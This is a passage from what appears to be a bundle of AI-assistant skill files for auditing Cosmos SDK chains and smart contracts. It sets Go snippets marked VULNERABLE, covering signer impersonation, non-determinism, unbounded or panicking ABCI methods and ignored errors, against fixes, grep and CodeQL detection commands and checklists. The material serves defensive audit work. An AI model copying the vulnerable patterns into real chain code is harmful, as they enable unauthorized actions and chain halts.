different architectures\nGOARCH=amd64 go build\nGOARCH=arm64 go build\n\n# Run same operations, compare state roots\n# Must be identical across architectures\n\n# Fuzz test with concurrent operations\ngo test -fuzz=FuzzEndBlocker -parallel=10\n```\n\n### ABCI Benchmarking\n```go\nfunc BenchmarkBeginBlocker(b *testing.B) {\n    ctx := setupMaximalState()  // Worst-case state\n    b.ResetTimer()\n\n    for i := 0; i < b.N; i++ {\n        BeginBlocker(ctx, keeper)\n    }\n\n    // Must complete in < 1 second\n    require.Less(b, b.Elapsed()/time.Duration(b.N), time.Second)\n}\n```\n\n### Invariant Testing\n```go\n// Run invariants in integration tests\nfunc TestInvariants(t *testing.T) {\n    app := setupApp()\n\n    // Execute operations\n    app.DeliverTx(...)\n\n    // Check invariants\n    _, broken := keeper.AllInvariants()(app.Ctx)\n    require.False(t, broken, \"invariant violation detected\")\n}\n```\n\n---\n\n## 9. Additional Resources\n\n- **Building Secure Contracts**: `building-secure-contracts/not-so-smart-contracts/cosmos/`\n- **Cosmos SDK Docs**: https://docs.cosmos.network/\n- **CodeQL for Go**: https://codeql.github.com/docs/codeql-language-guides/codeql-for-go/\n- **Cosmos Security Best Practices**: https://github.com/cosmos/cosmos-sdk/blob/main/docs/docs/learn/advanced/17-determinism.md\n\n---\n\n## 10. Quick Reference Checklist\n\nBefore completing Cosmos chain audit:\n\n**Non-Determinism (CRITICAL)**:\n- [ ] No map iteration in consensus code\n- [ ] No platform-dependent types (int, uint, float)\n- [ ] No goroutines in message handlers/ABCI\n- [ ] No select statements with multiple channels\n- [ ] No rand, time.Now(), memory addresses\n- [ ] All serialization is deterministic\n\n**ABCI Methods (CRITICAL)**:\n- [ ] BeginBlocker/EndBlocker computationally bounded\n- [ ] No unbounded iterations\n- [ ] No nested loops over large collections\n- [ ] All panic-prone operations validated\n- [ ] Benchmarked with maximum state\n\n**Message Handling (HIGH)**:\n- [ ] GetSigners() matches handler address usage\n- [ ] All error returns checked\n- [ ] Critical messages prioritized in CheckTx\n- [ ] All message types registered\n\n**Arithmetic & Accounting (MEDIUM)**:\n- [ ] Multiply before divide pattern used\n- [ ] Rounding favors protocol\n- [ ] Custom bookkeeping synced with x/bank\n- [ ] Invariant checks implemented\n\n**Testing**:\n- [ ] Cross-architecture builds tested\n- [ ] ABCI methods benchmarked\n- [ ] Invariants checked in CI\n- [ ] Integration tests cover all messages\n",
        "plugins/building-secure-contracts/skills/cosmos-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md": "## 6. Vulnerability Checklist (9 Patterns)\n\n### 6.1 INCORRECT GetSigners()  CRITICAL\n\n**Description**: Mismatch between address returned by `GetSigners()` and address actually used in handler allows unauthorized actions via signer impersonation.\n\n**Detection Patterns**:\n```go\n// VULNERABLE: GetSigners returns one address, handler uses different field\ntype MsgExample struct {\n    Signer  string  // Returned by GetSigners()\n    Author  string  // Actually used in handler\n}\n\nfunc (msg MsgExample) GetSigners() []sdk.AccAddress {\n    return []sdk.AccAddress{sdk.AccAddress(msg.Signer)}\n}\n\n// Handler uses Author instead!\nfunc handleMsgExample(ctx sdk.Context, msg MsgExample) error {\n    // WRONG: Using msg.Author instead of verified signer\n    return keeper.DoAction(ctx, msg.Author, msg.Data)\n}\n```\n\n**What to Check**:\n- [ ] `GetSigners()` returns address that is actually used in handler\n- [ ] No multiple address fields in message (signer, author, owner, from, etc.)\n- [ ] Handler only uses addresses from `GetSigners()`\n- [ ] User-provided addresses not stored without validation\n\n**Mitigation**:\n```go\n// SECURE: Single address field, used consistently\ntype MsgExample struct {\n    Signer string  // Only address field\n}\n\nfunc (msg MsgExample) GetSigners() []sdk.AccAddress {\n    return []sdk.AccAddress{sdk.AccAddress(msg.Signer)}\n}\n\nfunc handleMsgExample(ctx sdk.Context, msg MsgExample) error {\n    // Use the verified signer address\n    signers := msg.GetSigners()\n    return keeper.DoAction(ctx, signers[0], msg.Data)\n}\n```\n\n**Testing**:\n- Unit test with different signer/author values\n- Verify only GetSigners() address has authorization\n- Sanity tests for all message types\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/incorrect_signer\n\n---\n\n### 4.2 NON-DETERMINISM  CRITICAL - CHAIN HALT\n\n**Description**: Non-deterministic code in consensus causes different validators to produce different state roots, halting the chain. This is the most severe Cosmos vulnerability.\n\n**Detection Patterns**:\n\n#### Pattern 1: Map Iteration\n```go\n// VULNERABLE: Iterating over Go map (random order)\nassets := make(map[string]sdk.Coin)\nfor assetID, coin := range assets {  // NON-DETERMINISTIC!\n    keeper.ProcessAsset(ctx, assetID, coin)\n}\n```\n\n#### Pattern 2: Platform-Dependent Types\n```go\n// VULNERABLE: Platform-dependent integer types\nvar amount int   // Size differs: 32-bit vs 64-bit systems\nvar price float64  // Float arithmetic is non-deterministic\n\n// Serialization produces different bytes on different architectures\nbz := someSerializer(amount)  // Different on 32-bit vs 64-bit!\n```\n\n#### Pattern 3: Goroutines and Concurrency\n```go\n// VULNERABLE: Goroutines have non-deterministic execution order\ngo processTransaction(tx1)\ngo processTransaction(tx2)\n// Order of state updates is non-deterministic!\n```\n\n#### Pattern 4: Select Statements\n```go\n// VULNERABLE: Select with multiple ready channels\nselect {\ncase msg := <-ch1:  // Non-deterministic choice\n    process(msg)\ncase msg := <-ch2:\n    process(msg)\n}\n```\n\n#### Pattern 5: Other Sources\n```go\n// VULNERABLE: Other non-determinism sources\nrand.Intn(100)              // Random numbers\ntime.Now()                  // Local system time (use ctx.BlockTime())\n&obj                        // Memory addresses\njson.Marshal(map)           // Map serialization order\nfilepath.Walk()             // Filesystem traversal order\n```\n\n**What to Check**:\n- [ ] NO `range` over maps in any consensus code\n- [ ] NO `int`, `uint`, `float32`, `float64` types (use `int32`, `int64`, `sdk.Int`, `sdk.Dec`)\n- [ ] NO goroutines in message handlers or ABCI methods\n- [ ] NO `select` statements with multiple channels\n- [ ] NO `rand` package usage (use deterministic PRF)\n- [ ] NO `time.Now()` (use `ctx.BlockTime()` or `ctx.BlockHeight()`)\n- [ ] NO memory address usage (`&obj`, pointer comparisons)\n- [ ] NO non-deterministic serialization\n\n**Mitigation**:\n```go\n// SECURE: Deterministic iteration\n// Option 1: Sort map keys\nkeys := make([]string, 0, len(assets))\nfor k := range assets {\n    keys = append(keys, k)\n}\nsort.Strings(keys)  // Deterministic order\nfor _, k := range keys {\n    keeper.ProcessAsset(ctx, k, assets[k])\n}\n\n// Option 2: Use ordered data structure\n// Use sdk.KVStore with ordered iteration\n\n// SECURE: Platform-independent types\nvar amount int64     // Explicit 64-bit\nvar amount sdk.Int   // Arbitrary precision integer\nvar price sdk.Dec    // Decimal type for consensus\n\n// SECURE: Use block time, not system time\ntimestamp := ctx.BlockTime()  // Deterministic\nheight := ctx.BlockHeight()   // Deterministic\n```\n\n**Tool Detection**:\n```bash\n# Use CodeQL custom rules\ncodeql database create --language=go\ncodeql query run cosmos-non-determinism.ql\n\n# Look for patterns\ngrep -r \"range.*map\\[\" x/\ngrep -r \"go func\" x/\ngrep -r \"time.Now()\" x/\ngrep -r \"float64\\|float32\" x/\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/non_determinism\n\n---\n\n### 4.3 MESSAGES PRIORITY  HIGH\n\n**Description**: Missing prioritization of critical messages (oracle updates, emergency pause, governance) allows front-running and censorship during network congestion.\n\n**Detection Patterns**:\n```go\n// VULNERABLE: No priority for critical oracle update\nfunc (app *App) CheckTx(req abci.RequestCheckTx) abci.ResponseCheckTx {\n    // All messages treated equally, oracle updates can be delayed\n    return app.BaseApp.CheckTx(req)\n}\n\n// VULNERABLE: Emergency pause has same priority as normal txs\n// During congestion, pause message may not be included in time\n```\n\n**What to Check**:\n- [ ] Oracle/price feed updates have high priority\n- [ ] Emergency pause/circuit breaker messages prioritized\n- [ ] Critical governance proposals prioritized\n- [ ] CheckTx returns higher priority for critical message types\n- [ ] High fees required for priority transactions (prevent spam)\n\n**Mitigation**:\n```go\n// SECURE: Prioritize critical messages in CheckTx\nfunc (app *App) CheckTx(req abci.RequestCheckTx) abci.ResponseCheckTx {\n    tx, err := app.txDecoder(req.Tx)\n    if err != nil {\n        return sdkerrors.ResponseCheckTx(err, 0, 0, app.trace)\n    }\n\n    msgs := tx.GetMsgs()\n    priority := int64(0)\n\n    for _, msg := range msgs {\n        switch msg.(type) {\n        case *oracle.MsgUpdatePrice:\n            // Verify sender is authorized oracle\n            if isAuthorizedOracle(msg.GetSigners()[0]) {\n                priority = 1000000  // Highest priority\n            }\n        case *crisis.MsgPause:\n            // Verify sender is admin\n            if isAdmin(msg.GetSigners()[0]) {\n                priority = 1000000  // Highest priority\n            }\n        }\n    }\n\n    return abci.ResponseCheckTx{\n        Code:     0,\n        Priority: priority,\n        // High priority messages pay higher fees to prevent spam\n    }\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/messages_priority\n\n---\n\n### 4.4 SLOW ABCI METHODS  CRITICAL - CHAIN HALT\n\n**Description**: Computationally expensive `BeginBlocker` or `EndBlocker` with unbounded loops can exceed block time limits, halting the chain.\n\n**Detection Patterns**:\n```go\n// VULNERABLE: Unbounded loop in EndBlocker\nfunc EndBlocker(ctx sdk.Context, k keeper.Keeper) {\n    // Iterates over ALL users - could be millions!\n    k.IterateAllUsers(ctx, func(user User) bool {\n        reward := k.CalculateReward(ctx, user)  // Complex calculation\n        k.DistributeReward(ctx, user, reward)\n        return false\n    })\n}\n\n// VULNERABLE: Nested loops in BeginBlocker\nfunc BeginBlocker(ctx sdk.Context, k keeper.Keeper) {\n    pools := k.GetAllPools(ctx)        // 1000+ pools\n    for _, pool := range pools {\n        assets := k.GetPoolAssets(ctx, pool.ID)  // 100+ assets each\n        for _, asset := range assets {\n            k.UpdatePrice(ctx, pool, asset)  // Expensive calculation\n        }\n    }\n}\n\n// VULNERABLE: Unbounded state iteration\nfunc (k Keeper) ProcessExpiredOrders(ctx sdk.Context) {\n    // No limit on number of orders processed per block!\n    k.IterateExpiredOrders(ctx, func(order Order) bool {\n        k.CancelOrder(ctx, order)\n        return false  // Processes ALL expired orders\n    })\n}\n```\n\n**What to Check**:\n- [ ] BeginBlocker has bounded computational complexity\n- [ ] EndBlocker has bounded computational complexity\n- [ ] NO nested loops over unbounded collections\n- [ ] NO iterations over all users/pools/assets\n- [ ] Batch operations have size limits\n- [ ] Stress tests with maximum expected data\n\n**Mitigation**:\n```go\n// SECURE: Process limited batch per block\nfunc EndBlocker(ctx sdk.Context, k keeper.Keeper) {\n    maxProcessed := 100  // Process max 100 users per block\n\n    iterator := k.GetUnprocessedUsers(ctx)\n    defer iterator.Close()\n\n    count := 0\n    for ; iterator.Valid() && count < maxProcessed; iterator.Next() {\n        user := k.UnmarshalUser(iterator.Value())\n        reward := k.CalculateReward(ctx, user)\n        k.DistributeReward(ctx, user, reward)\n        k.MarkProcessed(ctx, user)\n        count++\n    }\n    // Remaining users processed in subsequent blocks\n}\n\n// SECURE: Limit nested iterations\nfunc BeginBlocker(ctx sdk.Context, k keeper.Keeper) {\n    // Process only active pools (limited set)\n    activePools := k.GetActivePools(ctx)  // Max 50 pools\n    for _, pool := range activePools {\n        // Process only top assets (limited set)\n        topAssets := k.GetTopPoolAssets(ctx, pool.ID, 10)\n        for _, asset := range topAssets {\n            k.UpdatePrice(ctx, pool, asset)\n        }\n    }\n}\n```\n\n**Testing**:\n```go\n// Benchmark ABCI methods\nfunc BenchmarkEndBlocker(b *testing.B) {\n    // Test with maximum expected state\n    ctx := setupMaximumState()  // 1M users, 10K pools, etc.\n\n    b.ResetTimer()\n    for i := 0; i < b.N; i++ {\n        EndBlocker(ctx, keeper)\n    }\n    // Must complete in < 1 second\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/abci_method_slow\n\n---\n\n### 4.5 ABCI METHODS PANIC  CRITICAL - CHAIN HALT\n\n**Description**: Unexpected panics in `BeginBlocker` or `EndBlocker` immediately stop the blockchain. Many Cosmos SDK types panic on invalid operations.\n\n**Detection Patterns**:\n\n#### Pattern 1: Panic-Prone Coin Operations\n```go\n// VULNERABLE: NewCoins panics on invalid coins\nfunc EndBlocker(ctx sdk.Context, k keeper.Keeper) {\n    // Panics if amount is negative or denom is invalid!\n    coins := sdk.NewCoins(sdk.NewCoin(userDenom, userAmount))\n    k.MintCoins(ctx, coins)\n}\n\n// VULNERABLE: Coin arithmetic panics\nreward := sdk.NewCoin(\"uatom\", sdk.NewInt(-100))  // PANIC: negative amount\n```\n\n#### Pattern 2: Dec/Int Operations\n```go\n// VULNERABLE: NewDec panics on invalid string\nfunc BeginBlocker(ctx sdk.Context, k keeper.Keeper) {\n    price := sdk.NewDec(priceString)  // PANIC if priceString is invalid!\n}\n\n// VULNERABLE: Division by zero\nratio := amount.Quo(sdk.ZeroInt())  // PANIC!\n```\n\n#### Pattern 3: SetParamSet\n```go\n// VULNERABLE: SetParamSet panics on validation failure\nfunc (k Keeper) UpdateParams(ctx sdk.Context, params Params) {\n    // PANIC if params are invalid!\n    k.paramSpace.SetParamSet(ctx, &params)\n}\n```\n\n#### Pattern 4: Array Out of Bounds\n```go\n// VULNERABLE: No bounds checking\nfunc processValidators(validators []Validator) {\n    top := validators[0]  // PANIC if empty slice!\n}\n```\n\n**What to Check**:\n- [ ] All `sdk.NewCoins()`, `sdk.NewCoin()` calls validated\n- [ ] All `sdk.NewDec()`, `sdk.NewInt()` calls validated\n- [ ] Division operations check for zero divisor\n- [ ] `SetParamSet` called only with validated params\n- [ ] Array/slice access has bounds checking\n- [ ] User input validated before use in panic-prone operations\n\n**Mitigation**:\n```go\n// SECURE: Validate before panic-prone operations\nfunc EndBlocker(ctx sdk.Context, k keeper.Keeper) {\n    // Validate denom and amount\n    if err := sdk.ValidateDenom(userDenom); err != nil {\n        ctx.Logger().Error(\"invalid denom\", \"error\", err)\n        return\n    }\n    if userAmount.IsNegative() {\n        ctx.Logger().Error(\"negative amount\")\n        return\n    }\n\n    coins := sdk.NewCoins(sdk.NewCoin(userDenom, userAmount))\n    k.MintCoins(ctx, coins)\n}\n\n// SECURE: Use safe constructors\nfunc (k Keeper) UpdatePrice(ctx sdk.Context, priceStr string) error {\n    // Safe: Returns error instead of panicking\n    price, err := sdk.NewDecFromStr(priceStr)\n    if err != nil {\n        return err\n    }\n\n    // Check for zero before division\n    if divisor.IsZero() {\n        return errors.New(\"division by zero\")\n    }\n    ratio := amount.Quo(divisor)\n\n    return nil\n}\n\n// SECURE: Bounds checking\nfunc processValidators(validators []Validator) {\n    if len(validators) == 0 {\n        return\n    }\n    top := validators[0]  // Safe\n}\n```\n\n**Tool Detection**:\n```bash\n# Use CodeQL to find panic-prone operations\ncodeql query run find-unvalidated-sdk-operations.ql\n\n# Manual review\ngrep -r \"sdk.NewDec\\|sdk.NewInt\\|sdk.NewCoins\" x/\ngrep -r \"\\.Quo\\|\\.Div\" x/\ngrep -r \"SetParamSet\" x/\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/abci_method_panics\n\n---\n\n### 4.6 BROKEN BOOKKEEPING  HIGH\n\n**Description**: Custom internal accounting alongside `x/bank` module becomes inconsistent when direct token transfers bypass internal bookkeeping.\n\n**Detection Patterns**:\n```go\n// VULNERABLE: Internal bookkeeping separate from x/bank\ntype Keeper struct {\n    // Internal tracking of balances\n    userBalances map[string]sdk.Coins  // NOT synchronized with x/bank!\n}\n\nfunc (k Keeper) Deposit(ctx sdk.Context, user string, amount sdk.Coins) {\n    // Updates internal bookkeeping\n    k.userBalances[user] = k.userBalances[user].Add(amount...)\n\n    // Also updates x/bank\n    k.bankKeeper.SendCoins(ctx, sender, moduleAccount, amount)\n}\n\n// PROBLEM: Direct IBC transfer bypasses internal bookkeeping!\n// User receives tokens via IBC -> x/bank updated but userBalances not updated\n// Invariant violated: sum(userBalances) != bankKeeper.GetSupply()\n```\n\n**What to Check**:\n- [ ] No custom balance tracking alongside x/bank\n- [ ] OR custom tracking uses blocklist to prevent unexpected transfers\n- [ ] Invariant checks compare internal accounting to x/bank\n- [ ] IBC transfers handled correctly\n- [ ] Module accounts use SendEnabled parameter\n\n**Mitigation**:\n```go\n// OPTION 1: Use blocklist to prevent unexpected transfers\nfunc (k Keeper) BeforeTokenTransfer(ctx sdk.Context, from, to string) error {\n    // Block all transfers except through our module\n    if !k.IsAuthorizedTransfer(ctx, from, to) {\n        return errors.New(\"direct transfers blocked\")\n    }\n    return nil\n}\n\n// OPTION 2: Use SendEnabled parameter\n// In x/bank params, set SendEnabled = false for your token\n// All transfers must go through your module\n\n// OPTION 3: Don't maintain separate bookkeeping\n// Use x/bank as source of truth, query when needed\nfunc (k Keeper) GetUserBalance(ctx sdk.Context, user string) sdk.Coins {\n    addr := sdk.AccAddress(user)\n    return k.bankKeeper.GetAllBalances(ctx, addr)\n}\n```\n\n**Invariant Testing**:\n```go\n// Invariant: Internal accounting matches x/bank\nfunc (k Keeper) InvariantCheck(ctx sdk.Context) error {\n    internalTotal := sdk.NewCoins()\n    for _, balance := range k.userBalances {\n        internalTotal = internalTotal.Add(balance...)\n    }\n\n    moduleBalance := k.bankKeeper.GetAllBalances(ctx, k.moduleAccount)\n\n    if !internalTotal.IsEqual(moduleBalance) {\n        return fmt.Errorf(\"bookkeeping mismatch: internal=%v bank=%v\",\n            internalTotal, moduleBalance)\n    }\n    return nil\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/broken_bookkeeping\n\n---\n\n### 4.7 ROUNDING ERRORS  MEDIUM\n\n**Description**: `sdk.Dec` type has precision issues and lacks associativity, causing rounding errors that can be exploited or cause incorrect calculations.\n\n**Detection Patterns**:\n```go\n// VULNERABLE: Division before multiplication (loses precision)\nsharePrice := totalValue.Quo(totalShares)  // Division first\nuserValue := sharePrice.Mul(userShares)    // Multiplication second\n// User gets less value due to rounding down in division\n\n// VULNERABLE: sdk.Dec associativity issues\na := sdk.NewDec(1)\nb := sdk.NewDec(10)\nc := sdk.NewDec(100)\n\nresult1 := a.Mul(b).Quo(c)  // (1 * 10) / 100 = 0.1\nresult2 := a.Quo(c).Mul(b)  // (1 / 100) * 10 = 0.1 (but different precision!)\n// result1 != result2 due to precision handling\n\n// VULNERABLE: Repeated rounding favors users\nfor _, user := range users {\n    reward := totalReward.Quo(sdk.NewDec(len(users)))  // Round each time\n    k.MintReward(ctx, user, reward)\n}\n// Total minted > totalReward due to rounding up\n```\n\n**What to Check**:\n- [ ] Multiplication before division pattern used\n- [ ] Rounding direction favors protocol, not users\n- [ ] No repeated rounding in loops\n- [ ] Consistent calculation order across all operations\n- [ ] Consider using integer arithmetic with scaling factor\n\n**Mitigation**:\n```go\n// SECURE: Multiply before divide (preserves precision)\nuserValue := totalValue.Mul(userShares).Quo(totalShares)\n// Full precision maintained until final division\n\n// SECURE: Round in favor of system\n// When distributing rewards, round down (users get slightly less)\nreward := totalReward.Mul(userShares).QuoTruncate(totalShares)\n\n// When calculating fees, round up (users pay slightly more)\nfee := amount.Mul(feeRate).QuoCeil(sdk.NewDec(10000))\n\n// SECURE: Distribute with remainder handling\ntotalDistributed := sdk.ZeroDec()\nfor i, user := range users {\n    if i == len(users)-1 {\n        // Last user gets remainder to ensure sum is exact\n        reward = totalReward.Sub(totalDistributed)\n    } else {\n        reward = totalReward.Quo(sdk.NewDec(len(users)))\n        totalDistributed = totalDistributed.Add(reward)\n    }\n    k.MintReward(ctx, user, reward)\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/rounding_errors\n\n---\n\n### 4.8 UNREGISTERED MESSAGE HANDLER  MEDIUM (Legacy Issue)\n\n**Description**: Message types defined in proto but not registered in `NewHandler` function cause messages to be accepted but silently ignored (pre-Cosmos SDK v0.47).\n\n**Detection Patterns**:\n```go\n// VULNERABLE: Message defined but not in handler (legacy Msg Service)\n// In types/msgs.proto\nmessage MsgWithdraw {\n    string sender = 1;\n    string amount = 2;\n}\n\n// In handler.go\nfunc NewHandler(k keeper.Keeper) sdk.Handler {\n    return func(ctx sdk.Context, msg sdk.Msg) (*sdk.Result, error) {\n        switch msg := msg.(type) {\n        case *types.MsgDeposit:\n            return handleMsgDeposit(ctx, k, msg)\n        // Missing: case *types.MsgWithdraw\n        default:\n            return nil, sdkerrors.ErrUnknownRequest\n        }\n    }\n}\n```\n\n**What to Check**:\n- [ ] Using Cosmos SDK v0.47+ with automatic handler registration\n- [ ] OR all message types in proto have corresponding handler case\n- [ ] Integration tests call all message types\n- [ ] CI checks for unregistered messages\n\n**Mitigation**:\n```go\n// OPTION 1: Use modern SDK (v0.47+) - handlers auto-registered\n// In msg_server.go\ntype msgServer struct {\n    Keeper\n}\n\nfunc (s msgServer) Deposit(ctx context.Context, msg *types.MsgDeposit) (*types.MsgDepositResponse, error) {\n    // Handler automatically registered via protobuf service\n}\n\nfunc (s msgServer) Withdraw(ctx context.Context, msg *types.MsgWithdraw) (*types.MsgWithdrawResponse, error) {\n    // Handler automatically registered\n}\n\n// OPTION 2: Verify all messages registered (legacy)\nfunc NewHandler(k keeper.Keeper) sdk.Handler {\n    return func(ctx sdk.Context, msg sdk.Msg) (*sdk.Result, error) {\n        switch msg := msg.(type) {\n        case *types.MsgDeposit:\n            return handleMsgDeposit(ctx, k, msg)\n        case *types.MsgWithdraw:  // Ensure all messages present!\n            return handleMsgWithdraw(ctx, k, msg)\n        default:\n            return nil, sdkerrors.ErrUnknownRequest\n        }\n    }\n}\n```\n\n**Testing**:\n```go\n// Integration test for all message types\nfunc TestAllMessageTypes(t *testing.T) {\n    // Get all message types from proto\n    messageTypes := getAllProtoMessageTypes()\n\n    for _, msgType := range messageTypes {\n        // Verify message can be submitted and processed\n        result, err := app.DeliverTx(ctx, msgType)\n        require.NoError(t, err)\n        require.NotNil(t, result)\n    }\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/message_handler_missing\n\n---\n\n### 4.9 MISSING ERROR HANDLER  HIGH\n\n**Description**: Ignoring error return values from keeper methods (especially `bankKeeper.SendCoins`) allows invalid operations to silently succeed.\n\n**Detection Patterns**:\n```go\n// VULNERABLE: Ignored error from SendCoins\nfunc (k Keeper) Withdraw(ctx sdk.Context, user string, amount sdk.Coins) {\n    // Error ignored! Withdrawal appears successful even if SendCoins fails\n    k.bankKeeper.SendCoins(ctx, moduleAccount, user, amount)\n\n    // Update state assuming withdrawal succeeded\n    k.DecrementBalance(ctx, user, amount)\n}\n\n// VULNERABLE: Deferred error handling too late\nfunc (k Keeper) ProcessBatch(ctx sdk.Context, txs []Transaction) {\n    for _, tx := range txs {\n        err := k.ProcessTransaction(ctx, tx)\n        // Error not checked, continues processing!\n    }\n}\n```\n\n**What to Check**:\n- [ ] ALL keeper method calls check error return values\n- [ ] `bankKeeper.SendCoins()` errors always handled\n- [ ] State updates only occur after successful operation\n- [ ] Errors propagated to caller\n- [ ] Use linters to detect ignored errors (errcheck)\n\n**Mitigation**:\n```go\n// SECURE: Check all errors\nfunc (k Keeper) Withdraw(ctx sdk.Context, user string, amount sdk.Coins) error {\n    // Check error from SendCoins\n    if err := k.bankKeeper.SendCoins(ctx, moduleAccount, user, amount); err != nil {\n        return err  // Withdrawal failed, no state change\n    }\n\n    // Only update state if SendCoins succeeded\n    k.DecrementBalance(ctx, user, amount)\n    return nil\n}\n\n// SECURE: Stop processing on first error\nfunc (k Keeper) ProcessBatch(ctx sdk.Context, txs []Transaction) error {\n    for _, tx := range txs {\n        if err := k.ProcessTransaction(ctx, tx); err != nil {\n            return fmt.Errorf(\"transaction failed: %w\", err)\n        }\n    }\n    return nil\n}\n```\n\n**Linter Configuration**:\n```yaml\n# .golangci.yml\nlinters:\n  enable:\n    - errcheck  # Detect unchecked errors\n    - goerr113  # Error handling rules\n\nlinters-settings:\n  errcheck:\n    check-blank: true  # Flag _ = err\n    check-type-assertions: true\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/cosmos/missing_error_handler\n\n---\n",
        "plugins/building-secure-contracts/skills/guidelines-advisor/SKILL.md": "---\nname: guidelines-advisor\ndescription: Smart contract development advisor based on Trail of Bits' best practices. Analyzes codebase to generate documentation/specifications, review architecture, check upgradeability patterns, assess implementation quality, identify pitfalls, review dependencies, and evaluate testing. Provides actionable recommendations.\n---\n\n# Guidelines Advisor\n\n## Purpose\n\nSystematically analyzes the codebase and provides guidance based on Trail of Bits' development guidelines:\n\n1. **Generate documentation and specifications** (plain English descriptions, architectural diagrams, code documentation)\n2. **Optimize on-chain/off-chain architecture** (only if applicable)\n3. **Review upgradeability patterns** (if your project has upgrades)\n4. **Check delegatecall/proxy implementations** (if present)\n5. **Assess implementation quality** (functions, inheritance, events)\n6. **Identify common pitfalls**\n7. **Review dependencies**\n8. **Evaluate test suite and suggest improvements**\n\n**Framework**: Building Secure Contracts - Development Guidelines\n\n---\n\n## How This Works\n\n### Phase 1: Discovery & Context\nExplores the codebase to understand:\n- Project structure and platform\n- Contract/module files and their purposes\n- Existing documentation\n- Architecture patterns (proxies, upgrades, etc.)\n- Testing setup\n- Dependencies\n\n### Phase 2: Documentation Generation\nHelps create:\n- Plain English system description\n- Architectural diagrams (using Slither printers for Solidity)\n- Code documentation recommendations (NatSpec for Solidity)\n\n### Phase 3: Architecture Analysis\nAnalyzes:\n- On-chain vs off-chain component distribution (if applicable)\n- Upgradeability approach (if applicable)\n- Delegatecall proxy patterns (if present)\n\n### Phase 4: Implementation Review\nAssesses:\n- Function composition and clarity\n- Inheritance structure\n- Event logging practices\n- Common pitfalls presence\n- Dependencies quality\n- Testing coverage and techniques\n\n### Phase 5: Recommendations\nProvides:\n- Prioritized improvement suggestions\n- Best practice guidance\n- Actionable next steps\n\n---\n\n## Assessment Areas\n\nI analyze 11 comprehensive areas covering all aspects of smart contract development. For detailed criteria, best practices, and specific checks, see [ASSESSMENT_AREAS.md](resources/ASSESSMENT_AREAS.md).\n\n### Quick Reference:\n\n1. **Documentation & Specifications**\n   - Plain English system descriptions\n   - Architectural diagrams\n   - NatSpec completeness (Solidity)\n   - Documentation gaps identification\n\n2. **On-Chain vs Off-Chain Computation**\n   - Complexity analysis\n   - Gas optimization opportunities\n   - Verification vs computation patterns\n\n3. **Upgradeability**\n   - Migration vs upgradeability trade-offs\n   - Data separation patterns\n   - Upgrade procedure documentation\n\n4. **Delegatecall Proxy Pattern**\n   - Storage layout consistency\n   - Initialization patterns\n   - Function shadowing risks\n   - Slither upgradeability checks\n\n5. **Function Composition**\n   - Function size and clarity\n   - Logical grouping\n   - Modularity assessment\n\n6. **Inheritance**\n   - Hierarchy depth/width\n   - Diamond problem risks\n   - Inheritance visualization\n\n7. **Events**\n   - Critical operation coverage\n   - Event naming consistency\n   - Indexed parameters\n\n8. **Common Pitfalls**\n   - Reentrancy patterns\n   - Integer overflow/underflow\n   - Access control issues\n   - Platform-specific vulnerabilities\n\n9. **Dependencies**\n   - Library quality assessment\n   - Version management\n   - Dependency manager usage\n   - Copied code detection\n\n10. **Testing & Verification**\n    - Coverage analysis\n    - Fuzzing techniques\n    - Formal verification\n    - CI/CD integration\n\n11. **Platform-Specific Guidance**\n    - Solidity version recommendations\n    - Compiler warning checks\n    - Inline assembly warnings\n    - Platform-specific tools\n\nFor complete details on each area including what I'll check, analyze, and recommend, see [ASSESSMENT_AREAS.md](resources/ASSESSMENT_AREAS.md).\n\n---\n\n## Example Output\n\nWhen the analysis is complete, you'll receive comprehensive guidance covering:\n\n- System documentation with plain English descriptions\n- Architectural diagrams and documentation gaps\n- Architecture analysis (on-chain/off-chain, upgradeability, proxies)\n- Implementation review (functions, inheritance, events, pitfalls)\n- Dependencies and testing evaluation\n- Prioritized recommendations (CRITICAL, HIGH, MEDIUM, LOW)\n- Overall assessment and path to production\n\nFor a complete example analysis report, see [EXAMPLE_REPORT.md](resources/EXAMPLE_REPORT.md).\n\n---\n\n## Deliverables\n\nI provide four comprehensive deliverable categories:\n\n### 1. System Documentation\n- Plain English descriptions\n- Architectural diagrams\n- Documentation gaps analysis\n\n### 2. Architecture Analysis\n- On-chain/off-chain assessment\n- Upgradeability review\n- Proxy pattern security review\n\n### 3. Implementation Review\n- Function composition analysis\n- Inheritance assessment\n- Events coverage\n- Pitfall identification\n- Dependencies evaluation\n- Testing analysis\n\n### 4. Prioritized Recommendations\n- CRITICAL (address immediately)\n- HIGH (address before deployment)\n- MEDIUM (address for production quality)\n- LOW (nice to have)\n\nFor detailed templates and examples of each deliverable, see [DELIVERABLES.md](resources/DELIVERABLES.md).\n\n---\n\n## Assessment Process\n\nWhen invoked, I will:\n\n1. **Explore the codebase**\n   - Identify all contract/module files\n   - Find existing documentation\n   - Locate test files\n   - Check for proxies/upgrades\n   - Identify dependencies\n\n2. **Generate documentation**\n   - Create plain English system description\n   - Generate architectural diagrams (if tools available)\n   - Identify documentation gaps\n\n3. **Analyze architecture**\n   - Assess on-chain/off-chain distribution (if applicable)\n   - Review upgradeability approach (if applicable)\n   - Audit proxy patterns (if present)\n\n4. **Review implementation**\n   - Analyze functions, inheritance, events\n   - Check for common pitfalls\n   - Assess dependencies\n   - Evaluate testing\n\n5. **Provide recommendations**\n   - Present findings with file references\n   - Ask clarifying questions about design decisions\n   - Suggest prioritized improvements\n   - Offer actionable next steps\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"System is simple, description covers everything\" | Plain English descriptions miss security-critical details | Complete all 5 phases: documentation, architecture, implementation, dependencies, recommendations |\n| \"No upgrades detected, skip upgradeability section\" | Upgradeability can be implicit (ownable patterns, delegatecall) | Search for proxy patterns, delegatecall, storage collisions before declaring N/A |\n| \"Not applicable\" without verification | Premature scope reduction misses vulnerabilities | Verify with explicit codebase search before skipping any guideline section |\n| \"Architecture is 